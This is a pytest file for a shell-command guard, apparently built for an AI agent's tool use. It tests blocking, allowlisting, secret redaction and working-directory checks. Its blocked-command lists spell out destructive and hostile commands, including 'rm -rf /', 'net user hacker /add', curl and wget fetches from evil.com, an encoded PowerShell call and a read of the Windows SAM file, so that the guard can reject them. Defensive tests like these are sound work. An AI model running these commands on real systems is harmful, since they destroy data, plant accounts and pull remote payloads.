"""Tests for shell command classification, blocking, and output processing."""

from __future__ import annotations

import ast
import textwrap
from pathlib import Path
from unittest.mock import patch

import pytest

from shell_guard import (
    classify_command,
    redact_secrets,
    truncate_output,
    validate_working_dir,
)


# ---------------------------------------------------------------------------
# Blocked commands — rejected unconditionally
# ---------------------------------------------------------------------------


class TestBlocked:
    @pytest.mark.parametrize("cmd", [
        "rm -rf /",
        "del C:\\file.txt",
        "format C:",
        "shutdown /s",
        "reboot",
        "taskkill /f /pid 1234",
        "reg delete HKCU\\Software",
        "net user hacker /add",
        "attrib +h secret.txt",
        "cipher /w:C:",
        "curl http://evil.com/malware.sh",
        "wget http://evil.com/payload",
        "sfc /scannow",
    ])
    def test_blocked_executables(self, cmd: str) -> None:
        v = classify_command(cmd)
        assert v.tier == "blocked", f"Expected blocked for: {cmd}"

    @pytest.mark.parametrize("cmd", [
        "pip install requests",
        "pip uninstall numpy",
        "pip download flask",
    ])
    def test_blocked_pip_subcommands(self, cmd: str) -> None:
        v = classify_command(cmd)
        assert v.tier == "blocked"

    @pytest.mark.parametrize("cmd", [
        "git push origin main",
        "git reset --hard HEAD",
        "git clean -fd",
        "git rm file.txt",
        "git config user.name",
    ])
    def test_blocked_git_subcommands(self, cmd: str) -> None:
        v = classify_command(cmd)
        assert v.tier == "blocked"

    def test_blocked_encoded_command(self) -> None:
        v = classify_command("powershell -EncodedCommand AAAA")
        assert v.tier == "blocked"
        assert "encoded" in v.reason.lower() or "blocked" in v.reason.lower()

    def test_blocked_system_path(self) -> None:
        v = classify_command("type C:\\Windows\\System32\\config\\SAM")
        assert v.tier == "blocked"
        assert "system path" in v.reason.lower() or "protected" in v.reason.lower()


# ---------------------------------------------------------------------------
# Chaining / structural patterns — blocked unconditionally
# ---------------------------------------------------------------------------


class TestStructuralBlocking:
    @pytest.mark.parametrize("cmd", [
        "echo hello && rm -rf /",
        "dir || del file.txt",
        "echo test; shutdown /s",
        "cat file | bash",
        "echo a & echo b",
    ])
    def test_chaining_blocked(self, cmd: str) -> None:
        v = classify_command(cmd)
        assert v.tier == "blocked"
        assert "chaining" in v.reason.lower() or "operator" in v.reason.lower()

    @pytest.mark.parametrize("cmd", [
        "echo hello > file.txt",
        "echo hello >> file.txt",
        "sort < input.txt",
    ])
    def test_redirection_blocked(self, cmd: str) -> None:
        v = classify_command(cmd)
        assert v.tier == "blocked"
        assert "redirect" in v.reason.lower()

    @pytest.mark.parametrize("cmd", [
        "echo $(whoami)",
        "echo `hostname`",
    ])
    def test_subshell_blocked(self, cmd: str) -> None:
        v = classify_command(cmd)
        assert v.tier == "blocked"
        assert "subshell" in v.reason.lower()


# ---------------------------------------------------------------------------
# Safe allowlist
# ---------------------------------------------------------------------------


class TestSafe:
    @pytest.mark.parametrize("cmd", [
        "git status",
        "git log",
        "git diff",
        "git branch",
        "python --version",
        "pip list",
        "pip freeze",
        "whoami",
        "hostname",
        "systeminfo",
        "tasklist",
        "dir",
        "echo hello",
        "type readme.txt",
    ])
    def test_safe_commands(self, cmd: str) -> None:
        v = classify_command(cmd)
        assert v.tier == "safe", f"Expected safe for: {cmd}"

    def test_safe_case_insensitive(self) -> None:
        v = classify_command("GIT STATUS")
        assert v.tier == "safe"

    def test_safe_with_extra_allowlist(self) -> None:
        v = classify_command("cargo build", extra_allowlist=["cargo build"])
        assert v.tier == "safe"
        assert "user-configured" in v.reason.lower()


# ---------------------------------------------------------------------------
# Risky — not blocked, not allowlisted
# ---------------------------------------------------------------------------


class TestRisky:
    @pytest.mark.parametrize("cmd", [
        "cargo build",
        "dotnet run",
        "make all",
        "java -version",
        "python -c \"print(1)\"",
        "node app.js",
        "npm install",
        "git show HEAD~1",
        "ipconfig /release",
        "date 01-01-2030",
    ])
    def test_risky_commands(self, cmd: str) -> None:
        v = classify_command(cmd)
        assert v.tier == "risky"

    def test_empty_command_blocked(self) -> None:
        v = classify_command("")
        assert v.tier == "blocked"

    def test_whitespace_only_blocked(self) -> None:
        v = classify_command("   ")
        assert v.tier == "blocked"


# ---------------------------------------------------------------------------
# Output processing
# ---------------------------------------------------------------------------


class TestOutputProcessing:
    def test_truncation(self) -> None:
        text = "\n".join(f"line {i}" for i in range(300))
        result, truncated = truncate_output(text, max_lines=200)
        assert truncated
        assert "100 more lines truncated" in result

    def test_no_truncation_needed(self) -> None:
        text = "short output"
        result, truncated = truncate_output(text)
        assert not truncated
        assert result == text

    def test_redact_api_key(self) -> None:
        text = "key=sk-1234567890abcdefghijklmnop"
        result = redact_secrets(text)
        assert "sk-" not in result
        assert "[REDACTED]" in result

    def test_redact_xai_key(self) -> None:
        text = "my key is xai-abcdefghijklmnopqrstuvwx"
        result = redact_secrets(text)
        assert "xai-" not in result
        assert "[REDACTED]" in result

    def test_redact_password(self) -> None:
        text = "password=hunter2"
        result = redact_secrets(text)
        assert "hunter2" not in result

    def test_redact_bearer_token(self) -> None:
        text = "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5c"
        result = redact_secrets(text)
        assert "eyJh" not in result

    def test_normal_text_untouched(self) -> None:
        text = "Hello world, this is normal output."
        result = redact_secrets(text)
        assert result == text


# ---------------------------------------------------------------------------
# Working directory validation
# ---------------------------------------------------------------------------


class TestWorkingDir:
    def test_default_returns_project_root(self) -> None:
        result = validate_working_dir(None)
        assert result.is_dir()

    def test_rejects_outside_roots(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setattr("shell_guard.get_allowed_roots", lambda: [Path("C:/NoSuchRoot")])
        with pytest.raises(PermissionError, match="outside allowed roots"):
            validate_working_dir("C:/Windows/System32")

    def test_accepts_project_root(self) -> None:
        from shell_guard import _PROJECT_ROOT
        result = validate_working_dir(str(_PROJECT_ROOT))
        assert result == _PROJECT_ROOT


# ---------------------------------------------------------------------------
# Static code check: shell=True never used
# ---------------------------------------------------------------------------


class TestNoShellTrue:
    def test_tools_py_no_shell_true(self) -> None:
        """Verify shell=True never appears in tools.py subprocess calls."""
        source = Path("tools.py").read_text(encoding="utf-8")
        tree = ast.parse(source)
        for node in ast.walk(tree):
            if isinstance(node, ast.keyword):
                if node.arg == "shell" and isinstance(node.value, ast.Constant):
                    assert node.value.value is not True, \
                        "shell=True found in tools.py — this is never allowed"

    def test_shell_guard_no_shell_true(self) -> None:
        """Verify shell=True never appears in shell_guard.py."""
        source = Path("shell_guard.py").read_text(encoding="utf-8")
        assert "shell=True" not in source
